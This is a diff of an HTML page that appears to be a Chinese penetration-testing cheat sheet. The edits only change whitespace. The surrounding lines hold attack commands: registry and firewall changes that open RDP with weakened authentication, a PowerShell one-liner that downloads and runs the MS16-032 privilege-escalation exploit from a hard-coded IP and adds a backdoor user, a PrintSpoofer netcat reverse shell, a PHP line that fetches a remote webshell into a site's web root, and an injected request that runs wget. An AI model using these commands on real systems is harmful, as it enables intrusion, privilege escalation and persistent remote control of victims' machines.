@@ -196,17 +196,17 @@ REG ADD <span style="color:#e6db74">&#34;HKLM\SYSTEM\CurrentControlSet\Control\T
 <li>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#通用开3389：</span>
 wmic RDTOGGLE WHERE ServerName<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;%COMPUTERNAME%&#39;</span> call SetAllowTSConnections <span style="color:#ae81ff">1</span>
-      
+
 <span style="color:#75715e">#For Win2003&amp;Win2008:</span>
 REG ADD HKLM<span style="color:#ae81ff">\S</span>YSTEM<span style="color:#ae81ff">\C</span>urrentControlSet<span style="color:#ae81ff">\C</span>ontrol<span style="color:#ae81ff">\T</span>erminal<span style="color:#e6db74">&#34; &#34;</span>Server /v fDenyTSConnections /t REG_DWORD /d <span style="color:#ae81ff">00000000</span> /f
-      
+
 <span style="color:#75715e">#windows2012</span>
 </code></pre></div></li>
 </ul>
 <p>wmic /namespace:\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS != &ldquo;&quot;) call setallowtsconnections 1
 wmic /namespace:\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName =&lsquo;RDP-Tcp&rsquo;) call setuserauthenticationrequired 1
 reg add &ldquo;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&rdquo; /v fSingleSessionPerUser /t REG_DWORD /d 0 /f</p>
-<pre><code>  
+<pre><code>
 </code></pre></li>
 <li>
 <p>注：</p>
@@ -214,11 +214,11 @@ reg add &ldquo;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&rdquo; /v f
 <li>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># 如果系统未配置过远程桌面服务，第一次开启时还需要添加防火墙规则，允许3389端口</span>
 netsh advfirewall firewall add rule name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Remote Desktop&#34;</span> protocol<span style="color:#f92672">=</span>TCP dir<span style="color:#f92672">=</span>in localport<span style="color:#f92672">=</span><span style="color:#ae81ff">3389</span> action<span style="color:#f92672">=</span>allow
-      
+
 <span style="color:#75715e"># 如果连接出错需要关闭远程连接的一个选项：Allow connections only from computers running Remote Desktop with Network Level Authentication (recommended)</span>
 <span style="color:#75715e">#关闭方法</span>
 REG ADD <span style="color:#e6db74">&#34;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&#34;</span> /v UserAuthentication /t REG_DWORD /d 0x00000000 /f
-      
+
 </code></pre></div></li>
 </ul>
 </li>
@@ -267,7 +267,7 @@ CVE-2020-0796
 <li>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">powershell
 Invoke-MS16-032.ps1 -Application cmd.exe -commandline <span style="color:#e6db74">&#34;/c net user evi1cg test123 /add&#34;</span>
-      
+
 powershell -nop -exec bypass -c <span style="color:#e6db74">&#34;IEX (New-Object Net.WebClient).DownloadString(&#39;http://122.51.93.116Invoke-MS16-032.ps1&#39;);Invoke-MS16-032 -Application cmd.exe -commandline &#39;/c net user evi1cg test123 /add&#39;&#34;</span>
 </code></pre></div></li>
 </ul>
@@ -283,7 +283,7 @@ powershell -nop -exec bypass -c <span style="color:#e6db74">&#34;IEX (New-Object
 <ul>
 <li>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">PrintSpoofer.exe -i -c cmd
-      
+
 PrintSpoofer.exe -c <span style="color:#e6db74">&#34;C:\TOOLS\nc.exe 10.10.13.37 1337 -e cmd&#34;</span>
 nc.exe -l -p <span style="color:#ae81ff">1337</span>
 </code></pre></div></li>
@@ -391,7 +391,7 @@ chmod <span style="color:#f92672">+</span>x exploit
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-basic" data-lang="basic"></code></pre></div></li>
 </ul>
 <p>file_put_contents('/www/wwwroot/xxx.com/public/a.php',file_get_contents(&lsquo;http://200.1.1.200:9090/b.php&rsquo;))</p>
-<pre><code>    
+<pre><code>
 - ```bash
 GET /test.do?c=test&amp;catid='-var_dump(%60wget%20http%3a%2f%2fxx.xx.xx.xx%3a8090%2f1.php%60)-'&amp;m=index&amp;s=news HTTP/1.1
 Host: www.xxx.com
